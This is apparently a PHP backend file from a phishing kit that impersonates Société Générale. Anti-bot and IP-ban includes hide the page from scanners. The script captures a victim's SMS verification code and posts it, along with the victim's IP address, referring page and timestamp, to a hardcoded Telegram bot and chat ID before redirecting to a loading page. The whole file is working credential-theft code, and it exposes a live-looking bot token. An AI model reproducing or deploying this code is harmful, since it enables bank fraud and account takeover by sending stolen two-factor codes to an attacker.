<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../../prevents/bots.php');
include ('../../prevents/antimar.php');
include ('../../prevents/banned-ip.php');
	include ('../../prevents/anti1.php');
	include ('../../prevents/anti2.php');
	include ('../../prevents/anti3.php');
	include ('../../prevents/anti4.php');
	include ('../../prevents/anti5.php');
	include ('../../prevents/anti6.php');
	include ('../../prevents/anti7.php');
	include ('../../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}

// Configuration
$botToken = "7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4";
$chatId = "8134069302";

// Récupérer l'adresse IP du visiteur
$ip = $_SERVER['REMOTE_ADDR'];
$page = basename($_SERVER['HTTP_REFERER']); // page précédente
$date = date("Y-m-d H:i:s");

// Récupérer les données du formulaire
$sms_code = isset($_POST['sms_code']) ? htmlspecialchars($_POST['sms_code']) : 'Non spécifié';
$validation_frequency = isset($_POST['validation_frequency']) ? htmlspecialchars($_POST['validation_frequency']) : 'Non spécifié';

// Construire le message
$message = "📲 *Code SMS reçu*\n\n";
$message .= "🔑 Code : `$sms_code`\n";
$message .= "🕓 Fréquence : $validation_frequency\n";
$message .= "🌐 IP : $ip\n";
$message .= "📄 Page : $page\n";
$message .= "🕰️ Date : $date";

// URL pour envoyer le message
$sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Paramètres à envoyer
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Envoi du message avec file_get_contents
file_get_contents($sendMessageUrl . '?' . http_build_query($params));

// Redirection
header("Location: ../loading.php");
exit;
